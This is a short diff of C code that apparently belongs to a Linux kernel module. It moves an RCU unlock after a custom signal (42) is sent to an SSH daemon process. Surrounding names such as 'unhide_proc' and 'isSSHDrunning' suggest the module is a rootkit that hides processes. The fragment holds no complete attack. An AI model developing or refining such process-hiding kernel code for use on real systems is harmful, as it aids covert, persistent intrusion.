@@ -72,9 +72,9 @@ int runner(void* par)
 
 			rcu_read_lock();
 			t = pid_task(find_vpid(ssh_pid), PIDTYPE_PID);
-			rcu_read_unlock();
 			if(t != NULL)
 				send_sig_info(42, &info, t);
+			rcu_read_unlock();
 
 			unhide_proc(ssh_pid);
 			isSSHDrunning = 0;
